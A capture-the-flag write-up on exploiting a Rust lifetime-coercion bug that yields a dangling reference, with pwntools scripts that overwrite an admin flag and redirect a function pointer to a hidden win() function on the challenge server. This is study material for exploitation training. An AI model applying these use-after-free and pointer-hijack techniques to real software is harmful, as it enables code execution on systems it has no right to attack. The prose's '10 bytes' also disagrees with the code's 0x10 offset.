# Unsound Memories and Deeper memories

## Introduction
The challenge includes a single [source code tarball](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/dci_summercamp2026/unsound-memories.zip)
containing a rust project, to be exploited

## Analysis
When attempting to compile the source code,we see the
following error:
```rust
error: lifetime may not live long enough
  --> src/lib.rs:15:12
   |
 8 | fn cache_ref<'call, 'extended, T: ?Sized>(x: &'call mut T) -> &'extended mut T {
   |              -----  --------- lifetime `'extended` defined here
   |              |
   |              lifetime `'call` defined here
...
15 |     let f: fn(_, &'call mut T) -> &'extended mut T = coerce;
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ type annotation requires that `'call` must outlive `'extended`
   |
   = help: consider adding the following bound: `'call: 'extended`
   = note: requirement occurs because of a mutable reference to `T`
   = note: mutable references are invariant over their type parameter
   = help: see <https://doc.rust-lang.org/nomicon/subtyping.html> for more information about variance

error: could not compile `nanolog` (lib) due to 1 previous error
```

In rust, a variable's lifetime is part of its type and 
indicates when it will be freed. since the lifetime may not live long enough, we see that there is a likely dangling pointer or UAF.

Looking at the `cache_ref()` function, we see it is
called in the `alloc_ref()` function like this:
```rust
fn cache_ref<'call, 'extended, T: ?Sized>(x: &'call mut T) -> &'extended mut T {
    fn coerce<'call, 'extended, T: ?Sized>(
        _: &'call &'extended (),
        v: &'extended mut T,
    ) -> &'call mut T {
        v
    }
    let f: fn(_, &'call mut T) -> &'extended mut T = coerce;
    f(ANCHOR, x)
}

fn alloc_ref() -> &'static mut [u8; BUFFER_SIZE] {
    let mut owned = Box::new([0u8; BUFFER_SIZE]);
    cache_ref(owned.as_mut())
}
```
The reference effectively lives longer than the object
it is borrowing,namely `owned`. This means `alloc_ref()`
returns a pointer to freed memory.Reading the rest of thesource code,
it seems that in order to get the flag all we have to do
is set the `is_admin` field of a structure to `1`.
```rust
    pub fn admin_flag<W: Write>(&mut self, index: usize, w: &mut W) -> Result<(), Error> {
        match self.admins.get_mut(index) {
            Some(Some(admin)) => {
                if admin.is_admin == 1 {
                    let flag = std::env::var("FLAG1").expect("FLAG1 not set -- Contact organizers");
                    writeln!(w, "Congratulations! {}", flag).map_err(|_| Error::Deleted)?;
                    Ok(())
                } else {
                    Err(Error::Deleted)
                }
            }
            Some(None) => Err(Error::Deleted),
            None => Err(Error::OutOfRange),
        }
    }

pub fn admin_new(&mut self) -> Result<usize, Error> {
    if self.admins.len() >= MAX_LOGS {
        return Err(Error::Full);
    }
    self.admins.push(Some(Box::new(AdminRecord {
        is_admin: 0,
        callback: Some(banner),
        username: [0u8; BUFFER_SIZE - 16],
    })));
    Ok(self.admins.len() - 1)
}

```
## Exploitation
since the admin structure is heap allocated, the first level should be a simple as:
1. Create a dangling reference
2. Creat an admin object that will overlap with the dangling reference
3. Edit the reference
4. Get the flag

All of the required functionality is directly exposed in `main()`
```rust
            5 => match state.ref_new() {
                Ok(index) => writeln!(w, "Created ref #{}", index)?,
                Err(e) => writeln!(w, "Error: {}", e)?,
            },
            // ...
            7 => {
                let index = prompt_index(r, w)?;
                let data = prompt_bytes(r, w)?;
                match state.ref_edit(index, &data) {
                    Ok(()) => writeln!(w, "Ref #{} updated.", index)?,
                    Err(e) => writeln!(w, "Error: {}", e)?,
                }
            }
            8 => match state.admin_new() {
                Ok(index) => writeln!(w, "Created admin #{}", index)?,
                Err(e) => writeln!(w, "Error: {}", e)?,
            },
            // ...
            11 => {
                let index = prompt_index(r, w)?;
                match state.admin_flag(index, w) {
                    Ok(()) => {}
                    Err(e) => writeln!(w, "Error: {}", e)?,
                }
            }

```
Which yields the following exploit for level 1:
```python
from  pwn import *
target = remote("54b41de1f4ecace71a8e1f95c16813bd-Unsound-Memories.ctf",1337)
snd = target.sendline
snd(b'5')
snd(b'8')
snd(b'7')
snd(b'0')
snd(b'1')
snd(b'\x01')
target.interactive()
```

## Deeper memories
Remember from level 1 that `create_ref()` creates a dangling reference? There is another flag in the binary, given by the
`win()` function:
```rust
fn win(_ctx: *const u8) {
    use std::io::Write;
    if let Ok(flag) = std::fs::read_to_string("/flag2") {
        let stdout = std::io::stdout();
        let mut h = stdout.lock();
        let _ = writeln!(h, "{}", flag.trim());
        let _ = h.flush();
    }
}
```
However, this function is not called anywhere, meaning we have to gain RCE to call this.The `adminRecord` structure has a function pointer in it.
```rust
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,
    callback: Option<fn(*const u8)>,
    username: [u8; BUFFER_SIZE - (8 + 8)],
}
```
We could overwrite this pointer to `win()` to get the second flag.

however, we do not have direct access to the binary

## Binary extraction and analysis
The challenge includes a `Dockerfile` which we may use for reproducible builds.Extracting the binary from the container is done like so:
```bash
docker build . -t ctf
docker run --rm --name extract ctf
docker cp ctf:/challenge/nanolog nanolog
```
(ensure you are in an amd64 machine)

Once obtained, the binary can be ran in gdb
```txt
_______                       .____                         _______       ________
 ╲      ╲ _____    ____   ____ │    │    ____   ____   ___  _╲   _  ╲      ╲_____  ╲
 ╱   │   ╲╲__  ╲  ╱    ╲ ╱  _ ╲│    │   ╱  _ ╲ ╱ ___╲  ╲  ╲╱ ╱  ╱_╲  ╲       _(__  <
╱    │    ╲╱ __ ╲│   │  (  <_> )    │__(  <_> ) ╱_╱  >  ╲   ╱╲  ╲_╱   ╲     ╱       ╲
╲____│__  (____  ╱___│  ╱╲____╱│_______ ╲____╱╲___  ╱    ╲_╱  ╲_____  ╱ ╱╲ ╱______  ╱
        ╲╱     ╲╱     ╲╱               ╲╱    ╱_____╱                ╲╱  ╲╱        ╲╱

[SYS] Database restored successfully.
[SYS] 0 logs recovered.
[SYS] 0 administrators recovered.
[SYS] Warning: reference cache contains stale entries.

[Claude G.P.T.]'s Activity Logger

1) New log
2) Show log
3) Edit log
4) Drop log
5) New ref
6) Show ref
7) Edit ref
0) Quit
> 5
Created ref #0
1) New log
2) Show log
3) Edit log
4) Drop log
5) New ref
6) Show ref
7) Edit ref
8) New admin
0) Quit
> 8
Created admin #0
1) New log
2) Show log
3) Edit log
4) Drop log
5) New ref
6) Show ref
7) Edit ref
8) New admin
9) Show admin
10) Drop admin
0) Quit
> 6
Enter index: 0
0000: 00 00 00 00 00 00 00 00  80 04 56 55 55 55 00 00  |..........VUUU..|
0010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
1) New log
2) Show log
3) Edit log
4) Drop log
5) New ref
6) Show ref
7) Edit ref
8) New admin
9) Show admin
10) Drop admin
0) Quit
>
```
The function pointer is `0x555555560480` , which is at offset
`0xc480` from the base. looking at this location in `radare2`,we notice this
```radare2
[0x0000c480]> pd 10
            ;-- rip:
            ; DATA XREF from fcn.0000ca90 @ 0xcbbc(r)
            0x0000c480      c3             ret
            0x0000c481      662e0f1f84..   nop word cs:[rax + rax]
            0x0000c48b      0f1f440000     nop dword [rax + rax]
            ; DATA XREF from fcn.0000a9a0 @ 0xab53(r)
 1435: fcn.0000c490 (int64_t arg_7h);
 `- args(sp[0x7..0x7]) vars(18:sp[0x1..0xc0])
           0x0000c490      55             push rbp
           0x0000c491      4157           push r15
           0x0000c493      4156           push r14
           0x0000c495      4155           push r13
           0x0000c497      4154           push r12
           0x0000c499      53             push rbx
           0x0000c49a      4881ec9800..   sub rsp, 0x98
```
There is another function starting at `0xc490` offset, probably `win`
since it is right after the default value of the function pointer,`banner`, in the source code. 
If this were to be true, we would only need to increment the pointer by 10 bytes, then call the `admin_show()` function to get the flag.Looking at `admin_show()` yields the following:
```rust
    pub fn admin_show<W: Write>(&self, index: usize, w: &mut W) -> Result<(), Error> {
        match self.admins.get(index) {
            Some(Some(admin)) => {
                writeln!(w, "Is admin : {}", admin.is_admin).map_err(|_| Error::Deleted)?;
                w.flush().map_err(|_| Error::Deleted)?;

                if let Some(cb) = admin.callback {
                    cb(&**admin as *const AdminRecord as *const u8);
                }
                Ok(())
            }
            Some(None) => Err(Error::Deleted),
            None => Err(Error::OutOfRange),
        }
    }

```
## Final exploit
We simply adapt the preceeding exploit to increment a pointer by 10 bytes, which yields the following:
```python
from  pwn import *
import heap_lib
target = remote("54b41de1f4ecace71a8e1f95c16813bd-Unsound-Memories.ctf",1337)
context.terminal = ['alacritty','-e']
#target = gdb.debug("./nanolog")
snd = target.sendline
new_ref = heap_lib.heap_func(b'5',target)
show_ref = heap_lib.heap_func(b'6',target)
edit_ref = heap_lib.heap_func(b'7',target)
new_admin = heap_lib.heap_func(b'8',target)
show_admin = heap_lib.heap_func(b'9',target)

new_ref()
new_admin()
target.recv()
show_ref(0)
target.recvuntil(b'80')
base = 0x80
parts = target.recvline()[1:].split(b' ')
for i in range(1,8):
    t = int(parts[i-1],16)
    print(hex(t))
    base += t << (i * 8)
edit_ref(0,16,b'\x00'*8 + p64(base + 0x10))
target.interactive()
```
